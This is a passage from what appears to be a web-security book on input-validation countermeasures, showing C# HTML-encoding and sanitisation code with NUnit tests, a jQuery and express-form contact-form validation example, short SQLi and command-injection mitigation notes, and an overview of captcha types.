                         output.Write(((int)ch).ToString(NumberFormatInfo.InvariantInfo));
                         output.Write(';');
                         numberOfEscapes++;
                      }
                      else
                         output.Write(ch);
                   }
                }
             }
             string encodedHtml = output.ToString();
             output.Dispose();
             return encodedHtml;
          }

          private static unsafe int IndexOfHtmlEncodingChars(string searchString) {
             int num = searchString.Length;
             fixed (char* chPtr1 = searchString) {
                char* chPtr2 = (char*)((UIntPtr)chPtr1);
                for (; num > 0; --num) {
                   char ch = *chPtr2;
                   if (ch <= 62) {
                      switch (ch) {
                         case '"':
                         case '&':
                         case '\'':
                         case '<':
                         case '>':
                         case '/':
                            return searchString.Length - num;
                      }
                   }
                   else if (ch >= 160 && ch < 256)
                      return searchString.Length - num;
                   ++chPtr2;
                }
             }
             return CharacterIndexNotFound;
          }
          
          private static char[] _htmlEntityEndingChars = new char[2] {
             ';',
             '&'
          };

          private static class HtmlEntities {
             private static string[] _entitiesList = new string[253] {
                "\"-quot",
                "&-amp",
                "'-apos",
                "<-lt",
                ">-gt",
                " -nbsp",
                "¡-iexcl",
                "¢-cent",
                "£-pound",
                "¤-curren",
                "¥-yen",
                "¦-brvbar",
                "§-sect",
                "¨-uml",
                "©-copy",
                "ª-ordf",
                "«-laquo",
                "¬-not",
                "\x00AD-shy",
                "®-reg",
                "¯-macr",
                "°-deg",
                "±-plusmn",
                "\x00B2-sup2",
                "\x00B3-sup3",
                "´-acute",
                "µ-micro",
                "¶-para",
                "·-middot",
                "¸-cedil",
                "\x00B9-sup1",
                "º-ordm",
                "»-raquo",
                "\x00BC-frac14",
                "\x00BD-frac12",
                "\x00BE-frac34",
                "¿-iquest",
                "À-Agrave",
                "Á-Aacute",
                "Â-Acirc",
                "Ã-Atilde",
                "Ä-Auml",
                "Å-Aring",
                "Æ-AElig",
                "Ç-Ccedil",
                "È-Egrave",
                "É-Eacute",
                "Ê-Ecirc",
                "Ë-Euml",
                "Ì-Igrave",
                "Í-Iacute",
                "Î-Icirc",
                "Ï-Iuml",
                "Ð-ETH",
                "Ñ-Ntilde",
                "Ò-Ograve",
                "Ó-Oacute",
                "Ô-Ocirc",
                "Õ-Otilde",
                "Ö-Ouml",
                "×-times",
                "Ø-Oslash",
                "Ù-Ugrave",
                "Ú-Uacute",
                "Û-Ucirc",
                "Ü-Uuml",
                "Ý-Yacute",
                "Þ-THORN",
                "ß-szlig",
                "à-agrave",
                "á-aacute",
                "â-acirc",
                "ã-atilde",
                "ä-auml",
                "å-aring",
                "æ-aelig",
                "ç-ccedil",
                "è-egrave",
                "é-eacute",
                "ê-ecirc",
                "ë-euml",
                "ì-igrave",
                "í-iacute",
                "î-icirc",
                "ï-iuml",
                "ð-eth",
                "ñ-ntilde",
                "ò-ograve",
                "ó-oacute",
                "ô-ocirc",
                "õ-otilde",
                "ö-ouml",
                "÷-divide",
                "ø-oslash",
                "ù-ugrave",
                "ú-uacute",
                "û-ucirc",
                "ü-uuml",
                "ý-yacute",
                "þ-thorn",
                "ÿ-yuml",
                "Œ-OElig",
                "œ-oelig",
                "Š-Scaron",
                "š-scaron",
                "Ÿ-Yuml",
                "ƒ-fnof",
                "\x02C6-circ",
                "˜-tilde",
                "Α-Alpha",
                "Β-Beta",
                "Γ-Gamma",
                "Δ-Delta",
                "Ε-Epsilon",
                "Ζ-Zeta",
                "Η-Eta",
                "Θ-Theta",
                "Ι-Iota",
                "Κ-Kappa",
                "Λ-Lambda",
                "Μ-Mu",
                "Ν-Nu",
                "Ξ-Xi",
                "Ο-Omicron",
                "Π-Pi",
                "Ρ-Rho",
                "Σ-Sigma",
                "Τ-Tau",
                "Υ-Upsilon",
                "Φ-Phi",
                "Χ-Chi",
                "Ψ-Psi",
                "Ω-Omega",
                "α-alpha",
                "β-beta",
                "γ-gamma",
                "δ-delta",
                "ε-epsilon",
                "ζ-zeta",
                "η-eta",
                "θ-theta",
                "ι-iota",
                "κ-kappa",
                "λ-lambda",
                "μ-mu",
                "ν-nu",
                "ξ-xi",
                "ο-omicron",
                "π-pi",
                "ρ-rho",
                "ς-sigmaf",
                "σ-sigma",
                "τ-tau",
                "υ-upsilon",
                "φ-phi",
                "χ-chi",
                "ψ-psi",
                "ω-omega",
                "ϑ-thetasym",
                "ϒ-upsih",
                "ϖ-piv",
                " -ensp",
                " -emsp",
                " -thinsp",
                "\x200C-zwnj",
                "\x200D-zwj",
                "\x200E-lrm",
                "\x200F-rlm",
                "–-ndash",
                "—-mdash",
                "‘-lsquo",
                "’-rsquo",
                "‚-sbquo",
                "“-ldquo",
                "”-rdquo",
                "„-bdquo",
                "†-dagger",
                "‡-Dagger",
                "•-bull",
                "…-hellip",
                "‰-permil",
                "′-prime",
                "″-Prime",
                "‹-lsaquo",
                "›-rsaquo",
                "‾-oline",
                "⁄-frasl",
                "€-euro",
                "ℑ-image",
                "℘-weierp",
                "ℜ-real",
                "™-trade",
                "ℵ-alefsym",
                "←-larr",
                "↑-uarr",
                "→-rarr",
                "↓-darr",
                "↔-harr",
                "↵-crarr",
                "⇐-lArr",
                "⇑-uArr",
                "⇒-rArr",
                "⇓-dArr",
                "⇔-hArr",
                "∀-forall",
                "∂-part",
                "∃-exist",
                "∅-empty",
                "∇-nabla",
                "∈-isin",
                "∉-notin",
                "∋-ni",
                "∏-prod",
                "∑-sum",
                "−-minus",
                "∗-lowast",
                "√-radic",
                "∝-prop",
                "∞-infin",
                "∠-ang",
                "∧-and",
                "∨-or",
                "∩-cap",
                "∪-cup",
                "∫-int",
                "∴-there4",
                "∼-sim",
                "≅-cong",
                "≈-asymp",
                "≠-ne",
                "≡-equiv",
                "≤-le",
                "≥-ge",
                "⊂-sub",
                "⊃-sup",
                "⊄-nsub",
                "⊆-sube",
                "⊇-supe",
                "⊕-oplus",
                "⊗-otimes",
                "⊥-perp",
                "⋅-sdot",
                "⌈-lceil",
                "⌉-rceil",
                "⌊-lfloor",
                "⌋-rfloor",
                "〈-lang",
                "〉-rang",
                "◊-loz",
                "♠-spades",
                "♣-clubs",
                "♥-hearts",
                "♦-diams"
             };    

             private static Dictionary<string, char> _lookupTable = GenerateLookupTable();    

             private static Dictionary<string, char> GenerateLookupTable() {
                Dictionary<string, char> dictionary =
                   new Dictionary<string, char>(StringComparer.Ordinal);
                foreach (string str in _entitiesList)
                   dictionary.Add(str.Substring(2), str[0]);
                return dictionary;
             }    

             public static char Lookup(string entity) {
                char ch;
                _lookupTable.TryGetValue(entity, out ch);
                return ch;
             }
          }
       }
    }

To drive the development of the `Sanitisation` API, we wrote the following tests. We created a `MockedOperationContext`, code not included here. We also used RhinoMocks as our mocking framework which is no longer being maintained. I would recommend NSubstitute instead if you were looking for a mocking framework for .NET. We also used NLog and wrapped it in `Common.Wrapper.Log`

{title="Drive Sanitisation API development", linenos=off, lang=C#}
    using System;
    using System.ServiceModel;
    using System.ServiceModel.Channels;
    using NUnit.Framework;
    using System.Configuration;
    using Rhino.Mocks;
    using Common.Wrapper.Log;
    using Common.WcfMock;
    using Common.WcfHelpers.ErrorHandling.Exceptions;
     
    namespace Sanitisation.UnitTest {
       [TestFixture]
       public class SanitiseTest {
          private const string _myTestIpv4Address = "My.Test.Ipv4.Address";
          private readonly int _maxLengthHtmlEncodedUserInput =
             int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlEncodedUserInput"]);
          private readonly int _maxLengthHtmlDecodedUserInput =
             int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlDecodedUserInput"]);
          private readonly string _encodedUserInput_thatsMaxDecodedLength =
             @"One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.
    One #x2F &amp;#x2F; two amp &amp; three #x27 &amp;#x27; four lt &lt; five quot &quot; six gt &gt;.";
          private readonly string _decodedUserInput_thatsMaxLength =
             @"One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.
    One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.";
     
          [Test]
          public void Sanitise_UserInput_WhenGivenNull_ShouldReturnEmptyString() {
             Assert.That(new Sanitise().UserInput(null), Is.EqualTo(string.Empty));
          }
     
          [Test]
          public void Sanitise_UserInput_WhenGivenEmptyString_ShouldReturnEmptyString() {
             Assert.That(new Sanitise().UserInput(string.Empty), Is.EqualTo(string.Empty));
          }

          [Test]
          public void Sanitise_UserInput_WhenGivenSanitisedString_ShouldReturnSanitisedString(
          ) {
             // Open the whitelist up in order to test the encoding without restriction.
             Assert.That(
                new Sanitise(whiteList: @"^[\w\s\.,#/&'<"">]+$").
                UserInput(_encodedUserInput_thatsMaxDecodedLength),
                Is.EqualTo(_encodedUserInput_thatsMaxDecodedLength)
             );
          }    

          [Test]
          [ExpectedException(typeof(SanitisationWcfException))]
          public void Sanitise_UserInput_ShouldThrowExceptionIfEscapedInputToLong() {
             // Truncated just for display. Create a string of 4001 characters.
             string fourThousandAndOneCharacters =
                "Four thousand characters.";
             string expectedError =
                "The un-modified string received from the client with " +
                "the following IP address: " +
                '"' + _myTestIpv4Address + "\" " +
                "exceeded the allowed maximum length of an escaped Html user input string. " +
                "The maximum length allowed is: " +
                _maxLengthHtmlEncodedUserInput +
                ". The length was: " +
                (_maxLengthHtmlEncodedUserInput+1) + ".";    

             using(new MockedOperationContext(StubbedOperationContext)) {
                try {
                   new Sanitise().UserInput(fourThousandAndOneCharacters);
                }
                catch(SanitisationWcfException e) {
                   Assert.That(e.Message, Is.EqualTo(expectedError));
                   Assert.That(e.UnsanitisedAnswer, Is.EqualTo(fourThousandAndOneCharacters));
                   throw;
                }
             }
          }    

          [Test]
          [ExpectedException(typeof(SanitisationWcfException))]
          public void Sanitise_UserInput_DecodedUserInputShouldThrowException_WhenMaxLengthHtmlDecodedUserInputIsExceeded() {
             char oneCharOverTheLimit = '.';
             string expectedError =
                "The string received from the client with the following IP address: " +
                "\"" + _myTestIpv4Address + "\" " +
                "after Html decoding exceded the allowed maximum length of" +
                " an un-escaped Html user input string." +
                Environment.NewLine +
                "The maximum length allowed is: " +
                _maxLengthHtmlDecodedUserInput +
                ". The length was: " +
                (_decodedUserInput_thatsMaxLength + oneCharOverTheLimit).Length +
                oneCharOverTheLimit;    

             using(new MockedOperationContext(StubbedOperationContext)) {
                try {
                   new Sanitise().UserInput(
                      _encodedUserInput_thatsMaxDecodedLength + oneCharOverTheLimit
                   );
                }
                catch(SanitisationWcfException e) {
                   Assert.That(e.Message, Is.EqualTo(expectedError));
                   Assert.That(
                      e.UnsanitisedAnswer,
                      Is.EqualTo(_encodedUserInput_thatsMaxDecodedLength + oneCharOverTheLimit)
                   );
                   throw;
                }
             }
          }    

          [Test]
          public void Sanitise_UserInput_ShouldLogAndSendEmail_IfNumberOfDecodedHtmlEntitiesDoesNotMatchNumberOfEscapes() {
             string encodedUserInput_with6HtmlEntitiesNotEscaped =
                _encodedUserInput_thatsMaxDecodedLength.Replace("&amp;#x2F;", "/");
             string errorWeAreExpecting =
                "It appears as if someone has circumvented the client side Html entity " +
                "encoding." + Environment.NewLine +
                "The requesting IP address was: " +
                "\"" + _myTestIpv4Address + "\" " +
                "The sanitised input we receive from the client was the following:" +
                Environment.NewLine +
                "\"" + encodedUserInput_with6HtmlEntitiesNotEscaped + "\"" +
                Environment.NewLine +
                "The same input after decoding and re-escaping on the server side was " +
                "the following:" +
                Environment.NewLine +
                "\"" + _encodedUserInput_thatsMaxDecodedLength + "\"";
             string sanitised;
             // setup _logger
             ILogger logger = MockRepository.GenerateMock<ILogger>();
             logger.Expect(lgr => lgr.logError(errorWeAreExpecting));    

             Sanitise sanitise = new Sanitise(@"^[\w\s\.,#/&'<"">]+$", logger);    

             using (new MockedOperationContext(StubbedOperationContext)) {
                // Open the whitelist up in order to test the encoding etc.
                sanitised = sanitise.UserInput(encodedUserInput_with6HtmlEntitiesNotEscaped);
             }    

             Assert.That(sanitised, Is.EqualTo(_encodedUserInput_thatsMaxDecodedLength));
             logger.VerifyAllExpectations();
          }              

          private static IOperationContext StubbedOperationContext {
             get {
                IOperationContext operationContext =
                   MockRepository.GenerateStub<IOperationContext>();
                int port = 80;
                RemoteEndpointMessageProperty remoteEndpointMessageProperty =
                   new RemoteEndpointMessageProperty(_myTestIpv4Address, port);
                operationContext.Stub(
                   oc => oc.IncomingMessageProperties[RemoteEndpointMessageProperty.Name]
                ).Return(remoteEndpointMessageProperty);
                return operationContext;
             }
          }
       }
    }

And finally the API code we used to perform the sanitisation:

{title="Sanitisation API", linenos=on, lang=C#}
    using System;
    using System.Configuration;
    // Todo : Ideally we should be using Dependency Injection.
    // Researched best candidate was Simple Injector.
    using OperationContext = System.ServiceModel.Web.MockedOperationContext;
    using System.ServiceModel.Channels;
    using Common.Security.Sanitisation;
    using Common.WcfHelpers.ErrorHandling.Exceptions;
    using Common.Wrapper.Log;
     
    namespace Sanitisation {
     
       public class Sanitise {
          private readonly string _whiteList;
          private readonly ILogger _logger;
     
          private string RequestingIpAddress {
             get {
                RemoteEndpointMessageProperty remoteEndpointMessageProperty =
                   OperationContext.Current.IncomingMessageProperties[
                      RemoteEndpointMessageProperty.Name
                   ] as RemoteEndpointMessageProperty;
                return (
                   (remoteEndpointMessageProperty != null) ?
                   remoteEndpointMessageProperty.Address :
                   string.Empty
                );
             }
          }

          /// <summary>
          /// Provides server side escaping of Html entities, and runs the supplied
          /// whitelist character filter over the user input string.
          /// </summary>
          /// <param name="whiteList">Should be provided by DI from the ResourceFile.</param>
          /// <param name="logger">
          /// Should be provided by DI. Needs to be an asynchronous logger.
          /// </param>
          /// <example>
          /// The whitelist can be obtained from a ResourceFile like so...
          /// <code>
          /// private Resource _resource;
          /// _resource.GetString("WhiteList");
          /// </code>
          /// </example>
          public Sanitise(string whiteList = "", ILogger logger = null) {
             _whiteList = whiteList;
             _logger = logger ?? new Logger();
          }

          /// <summary>
          /// 1) Check field lengths.         Client side validation may have been negated.
          /// 2) Check against white list.    Client side validation may have been negated.
          /// 3) Check Html escaping.         Client side validation may have been negated.
           
          /// Generic Fail actions:   * Drop the payload.
          ///                           No point in trying to massage and save,
          ///                           as it won't be what the user was expecting,
          ///                         * Add full error to a WCFException Message and throw.
          ///                         * WCF interception reads WCFException.MessageForClient,
          ///                           and sends it to the user.
          ///                         * On return, log the WCFException's Message.
          ///                         
          /// Escape Fail actions:    * Asynchronously Log and email full error to support.
           
           
          /// 1) BA confirmed 50 for text, and 400 for textarea.
          ///     As we don't know the field type, we'll have to go for 400."
          ///
          ///     First we need to check that we haven't been sent some huge string.
          ///     So we check that the string isn't longer than 400 * 10 = 4000.
          ///     10 is the length of our double escaped character references.
          ///     Or, we ask the business for a number."
          ///     If we fail here,
          ///        perform Generic Fail actions and don't complete the following steps.
          /// 
          ///     Convert all Html Entity Encodings back to their equivalent characters,
          ///        and count how many occurrences.
          ///
          ///     If the string is longer than 400,
          ///        perform Generic Fail actions and don't complete the following steps.
          /// 
          /// 2) check all characters against the white list
          ///     If any don't match,
          ///        perform Generic Fail actions and don't complete the following steps.
          /// 
          /// 3) re html escape (as we did in JavaScript), and count how many escapes.
          ///     If cnt > cnt of Html Entity Encodings back to their equivalent characters,
          ///        Perform Escape Fail actions. Return sanitised string.
          /// 
          ///     If we haven't returned, return sanitised string.
           
           
          /// Performs checking on the text passed in,
          ///    to verify that client side escaping and whitelist validation
          ///    has already been performed.
          /// Performs decoding, and re-encodes.
          ///    Counts that the number of escapes was the same,
          ///    otherwise we log and send email with the details to support.
          /// Throws exception if the client side validation failed to restrict the
          ///    number of characters in the escaped string we received.
          ///    This needs to be intercepted at the service.
          ///    The exceptions default message for client needs to be passed back to the user.
          ///    On return, the interception needs to log the exception's message.
          /// </summary>
          /// <param name="sanitiseMe"></param>
          /// <returns></returns>
          public string UserInput(string sanitiseMe) {
             if (string.IsNullOrEmpty(sanitiseMe))
                return string.Empty;
           
             ThrowExceptionIfEscapedInputToLong(sanitiseMe);
           
             int numberOfDecodedHtmlEntities = 0;
             string decodedUserInput =
                HtmlDecodeUserInput(sanitiseMe, ref numberOfDecodedHtmlEntities);
           
             if(!decodedUserInput.CompliesWithWhitelist(whiteList: _whiteList)) {
                string error =
                   "The answer received from client with the following IP address: " +
                   "\"" + RequestingIpAddress + "\" " +
                   "had characters that failed to match the whitelist.";
                throw new SanitisationWcfException(error);
             }
           
             int numberOfEscapes = 0;
             string sanitisedUserInput = decodedUserInput.HtmlEncode(ref numberOfEscapes);
           
             if(numberOfEscapes != numberOfDecodedHtmlEntities) {
                AsyncLogAndEmail(sanitiseMe, sanitisedUserInput);
             }
           
             return sanitisedUserInput;
          }

          /// <note>
          /// Make sure the logger is setup to log asynchronously
          /// </note>
          private void AsyncLogAndEmail(string sanitiseMe, string sanitisedUserInput) {
             // no need for SanitisationException    

             _logger.logError(
                "It appears as if someone has circumvented the client side " +
                "Html entity encoding." +
                Environment.NewLine +
                "The requesting IP address was: " +
                "\"" + RequestingIpAddress + "\" " +
                "The sanitised input we receive from the client was the following:" +
                Environment.NewLine +
                "\"" + sanitiseMe + "\"" +
                Environment.NewLine +
                "The same input after decoding and re-escaping on the " +
                "server side was the following:" +
                Environment.NewLine +
                "\"" + sanitisedUserInput + "\""
             );
          }

          /// <summary>
          /// This procedure may throw a SanitisationWcfException.
          /// If it does, ErrorHandlerBehaviorAttribute will need to pass the
          /// "messageForClient" back to the client from within the
          /// IErrorHandler.ProvideFault procedure.
          /// Once execution is returned,
          /// the IErrorHandler.HandleError procedure of ErrorHandlerBehaviorAttribute
          /// will continue to process the exception that was thrown in the way of
          /// logging sensitive info.
          /// </summary>
          /// <param name="toSanitise"></param>
          private void ThrowExceptionIfEscapedInputToLong(string toSanitise) {
             int maxLengthHtmlEncodedUserInput =
                int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlEncodedUserInput"]);
             if (toSanitise.Length > maxLengthHtmlEncodedUserInput) {
                string error =
                   "The un-modified string received from the client " +
                   "with the following IP address: " +
                   "\"" + RequestingIpAddress + "\" " +
                   "exceeded the allowed maximum length of " +
                   "an escaped Html user input string. " +
                   "The maximum length allowed is: " +
                   maxLengthHtmlEncodedUserInput +
                   ". The length was: " +
                   toSanitise.Length + ".";
                throw new SanitisationWcfException(error, unsanitisedAnswer: toSanitise);
             }
          }

          private string HtmlDecodeUserInput(
             string doubleEncodedUserInput,
             ref int numberOfDecodedHtmlEntities
          ) {
             string decodedUserInput =
                doubleEncodedUserInput.HtmlDecode(
                   ref numberOfDecodedHtmlEntities
                ).HtmlDecode(ref numberOfDecodedHtmlEntities) ??
                string.Empty;
             
             // if the decoded string is longer than MaxLengthHtmlDecodedUserInput throw
             int maxLengthHtmlDecodedUserInput =
                int.Parse(ConfigurationManager.AppSettings["MaxLengthHtmlDecodedUserInput"]);
             if(decodedUserInput.Length > maxLengthHtmlDecodedUserInput) {
                throw new SanitisationWcfException(
                   "The string received from the client with the following IP address: " +
                   "\"" + RequestingIpAddress + "\" " +
                   "after Html decoding exceded the allowed maximum length " +
                   "of an un-escaped Html user input string." +
                   Environment.NewLine +
                   "The maximum length allowed is: " +
                   maxLengthHtmlDecodedUserInput +
                   ". The length was: " +
                   decodedUserInput.Length + ".",
                   unsanitisedAnswer: doubleEncodedUserInput
                );
             }
             return decodedUserInput;
          }
       }
    }

As you can see, there is a lot more work on the server side than the client side.

##### Example in JavaScript and NodeJS {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-nodejs}

A>
A> Without sanitisation, things are a lot simpler.
A>

For the next example we use a single page app. Switching to `jQuery.validator` on the client side and `express-form` on the server side. Our example is a simple contact form. I have only shown the parts relevant to validation and filtering.

Once the jQuery plugin (which is a module) `validate` is loaded, jQuery is passed to it. The plugin extends the jQuery prototype with its `validate` method. Our contact.js script then loads in the browser. We then call `ContactForm.initContactForm();`. ContactForm is immediately invoked and returns an object, of which we call `initContactForm()` on.

We add a custom validation function to our `validator` by way of `addMethod`. This function will take the value being tested, the element itself and a regular expression to test against. You can see we use this function when we pass our rules within the `options` object to `validate` which internally passes them to its `validator`.

The `validate` documentation explains the sequence of events that your custom rules will be applied in.

We pass `options` containing:

* `rules`
* `messages`
* `submitHandler` which is bound to the native `submit` event

There are many other options you can provide. I think the code is fairly self explanatory:

{title="contact.js", linenos=off, lang=JavaScript}
    var ContactForm = function () {

       return {

          //Contact Form
          initContactForm: function () {
             // Validation
             $.validator.addMethod('fieldValidated', function (value, element, regexpr) {
                return regexpr.test(value);
             },
             'No dodgy characters thanks.');
             $("#sky-form3").validate({
                // Rules for form validation
                rules: {
                   name: {
                      required: true,
                      minlength: 2,
                      maxlength: 50,
                      fieldValidated: /^[a-zA-Z ']+$/
                   },
                   email: {
                      required: true,
                      email: true
                   },
                   message: {
                      required: true,
                      minlength: 10,
                      maxlength: 1000,
                      fieldValidated: /^[a-zA-Z0-9-_ \?.,]+$/
                   }
                },

                // Messages for form validation
                messages: {
                   name: {
                      required: 'Please enter your name'
                   },
                   email: {
                      required: 'Please enter your email address',
                      email: 'Please enter a VALID email address'
                   },
                   message: {
                      required: 'Please enter your message'
                   }
                },

                // Ajax form submition. For details see jQuery Form Plugin:
                // http://malsup.com/jquery/form/
                submitHandler: function (form) {
                   $(form).ajaxSubmit({
                      beforeSend: function () {
                         // Useful for doing things like adding wait spinners
                         // or any work you want to do before sending.
                         // Todo: I think we need a wait spinner here.
                      },
                      // type: 'POST' // Default;
                      dataType: 'json',
                      success: function (responseText, statusText) {
                         // Handle success
                      },
                      error: function (error) {
                         // Handle error
                      }
                   });
                },

                // Do not change code below
                errorPlacement: function(error, element) {
                   error.insertAfter(element.parent());
                }
             });
          }
       };
    }();

Shifting our attention to the server side now. First up we have got the home route of the single page app. Within the home route, we have also got the `/contact` route which uses the `express-form` middleware. You can see the middleware first in action on line 82.

{title="routes/home.js", linenos=on, lang=JavaScript}
    var logger = require('../util/logger');
    var form = require('express-form');
    var fieldToValidate = form.field;
    var os = require('os');    

    function home(req, res) {
       res.redirect('/');
    }

    function index(req, res) {
       res.render('home', { title: 'Home', id: 'home', brand: 'your brand' });
    }

    function validate() {
       return form(
          // trim is filtering. toBoolean is some simple sanitisation. The rest is validation.
          fieldToValidate('name').
             trim().
             required().
             minLength(2).
             maxLength(50).
             is(/^[a-zA-Z ']+$/), // Regex same as cleint side.
          fieldToValidate('email').
             trim().
             required().
             isEmail(),
          fieldToValidate('message').
             trim().
             required().
             minLength(10).
             maxLength(1000).
             is(/^[a-zA-Z0-9-_ \?.,]+$/), // Regex same as cleint side.
          fieldToValidate('subscribe-to-mailing-list').toBoolean(),
          // I discuss the next line of code as part of a solution to what
          // captchas are trying to solve below in the Captcha section.
          // Bots love to populate everything.
          fieldToValidate('bot-pot').maxLength(0)
       );
    }

    // Using express-form: req.form is the validated req.body
    function contact(req, res) {
       
       if(req.form.isValid)
          sendEmail(req, res);
       else {
          (function alertEmail() {
             var reqBody =
                'Body of contact request (server-side unvalidated): ' +
                JSON.stringify(req.body);
             var reqForm =
                'Form of contact request (server-side validated): ' +
                JSON.stringify(req.form);
             var validationErrors =
                'Errors produced by express-form validation: ' +
                req.form.errors;
             var details =
                os.EOL +
                reqBody +
                os.EOL +
                os.EOL +
                reqForm +
                os.EOL +
                os.EOL +
                validationErrors +
                os.EOL;
             // Logger.emailLoggerFailure shown in the Insufficient Logging section
             logger.crit(
                '',
                'Validation error for my website contact form. ',
                {details: details},
                logger.emailLoggerFailure
             );
          }());
          res.status(418).send({error: 'User input was not valid. Try teliporting instead.'});
       }
    }

    module.exports = function (app) {
       app.get('/', index);
       app.get('/home', home); 
       app.post('/contact', validate(), contact);
    };

Following is the routing module that loads all other routes

{title="routes/index.js", linenos=off, lang=JavaScript}
    // This module loads dynamically all routes modules located in the routes/ directory.
     
    'use strict';
    var fs = require('fs');
    var path = require('path');

    module.exports = function (app) {
       fs.readdirSync(path.join(__dirname)).forEach(function (file) {
          // Avoid to read this current file.
          if (file === path.basename(__filename)) { return; }

          // Load the route file.
          require('./' + file)(app);
       });
    };

Now our entry point into the application. We load routes on line 30.

{title="app.js", linenos=on, lang=JavaScript}
    var http = require('http');
    var express = require('express');
    var path = require('path');
    var morganLogger = require('morgan');
    // Due to bug in node-config the next line is needed before config is required.
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');
    // Yes the following are hoisted, but it's OK in this situation.
    var logger = require('./util/logger'); // Or use requireFrom module so no relative paths.
    var methodOverride = require('method-override');
    // body-parser needs to be added in the middleware stack before using
    // express-form: https://github.com/freewil/express-form/issues/21
    var bodyParser = require('body-parser');
    var errorHandler = require('errorhandler');
    var app = express();
    //...
    logger.init();
    app.set('port', process.env.PORT || 3000);
    app.set('views', __dirname + '/views');
    app.set('view engine', 'jade');
    //...
    // In order to utilise connect/express logger module in our third party logger,
    // Pipe the messages through.
    app.use(morganLogger('combined', {stream: logger.stream}));
    app.use(methodOverride());
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(express.static(path.join(__dirname, 'public')));
    //...
    require('./routes')(app);

    if ('development' == app.get('env')) {
       app.use(errorHandler({ dumpExceptions: true, showStack: true }));
       //...
    }
    if ('production' == app.get('env')) {
       app.use(errorHandler());
       //...
    }

    http.createServer(app).listen(app.get('port'), function(){
       logger.info(
          "Express server listening on port " + app.get('port') + ' in '
          + process.env.NODE_ENV + ' mode'
       );
    });

As I mentioned previously in the ["What is Validation"](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation) section, some of the libraries seem confused about the differences between the practises of validation, filtering and sanitisation. For example `express-form` has sanitisation functions that are under their ["Filter API"](https://github.com/freewil/express-form#filter-api). 
`entityEncode`, `entityDecode`, even the Type Coercion functions are actually sanitisation rather than filtering.

Maybe it is semantics, but `toFloat`, `toInt`, ... `ifNull` are sanitisation functions.

`trim`, ... is filtering, but `toLower`, ... is sanitisation again. These functions listed in the documentation under the Filter API should be in their specific sections.

Refer to the section [above](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation) for a refresher on validation, filtering and sanitisation if you need it.

##### Other things to think about

* Try and make all of your specific input fields conform to well structured semantic types. Like dates, social security numbers, zip codes, email addresses, etc. This way the developer should be able to define a very strong validation, filtering and sanitisation (if needed) specification for each one. Thus making the task of assuring all input is safe before it reaches any execution contexts easier.
* If the input field comes from a fixed set of options, like a drop down list or radio buttons, then the input needs to match exactly one of the values offered to the user in the first place.
* Database accounts (in fact all accounts) should use [least privilege](#web-applications-countermeasures-management-of-application-secrets-least-privilege)
* Well structured data, like dates, social security numbers, zip codes, email addresses, etc. then the developer should be able to define a very strong validation pattern

#### Buffer Overflows {#web-applications-countermeasures-buffer-overflows}

_Todo_

#### Cross-Site Scripting (XSS) {#web-applications-countermeasures-cross-site-scripting}

This is a place holder section. The countermeasures are covered in the [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation) section.

#### Cross-Site Request Forgery (CSRF)

_Todo_

#### SQLi {#web-applications-countermeasures-sqli}

There are a few options here:

* Use prepared statements and/or parameterised queries
* Consider using Stored Procedures
* Read up on the [OWASP SQLi Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)
* And even before any of these points above, make sure you have the generic input [Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic) that we have already discussed covered, so all user input is validated, filtered and sanitised, both client and server side, before it gets anywhere near your queries.

There are plenty of easy to find and understand resources on the inter-webs around SQLi mitigations and the countermeasures are generally very easy to implement. So now you have no excuse.

#### Command Injection {#web-applications-countermeasures-command-injection}

On top of the points mentioned above under [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation), 
[This article](http://www.golemtechnologies.com/articles/shell-injection) is quite good.

%% Command Injection in NodeJS: https://blog.liftsecurity.io/2014/08/19/Avoid-Command-Injection-Node.js

#### LDAP Injection {#web-applications-countermeasures-ldap-injection}

_Todo_

#### XPath Injection {#web-applications-countermeasures-xpath-injection}

_Todo_

#### XQuery Injection {#web-applications-countermeasures-xquery-injection}

_Todo_

#### XSLT Injection {#web-applications-countermeasures-xslt-injection}

_Todo_

#### XML Injection {#web-applications-countermeasures-xml-injection}

_Todo_

#### Captcha
![](images/ThreatTags/PreventionVERYEASY.png)

##### Types

&nbsp;

**Text Recognition**

recaptcha uses this technique. See below for details.

**Image Recognition**

Uses images which users have to perform certain operations on, like dragging them to another image. For example: "Please drag all cat images to the cat mat.", or "Please select all images of things that dogs eat." sweetcaptcha is an example of this type of captcha. This type completely rules out the visually impaired users.

**Friend Recognition**

Pioneered by... you guessed it. Facebook. This type of captcha focusses on human hackers, the idea being that they will not know who your friends are. 

"_Instead of showing you a traditional captcha on Facebook, one of the ways we may help verify your identity is through social authentication. We will show you a few pictures of your friends and ask you to name the person in those photos. Hackers halfway across the world might know your password, but they don't know who your friends are._"

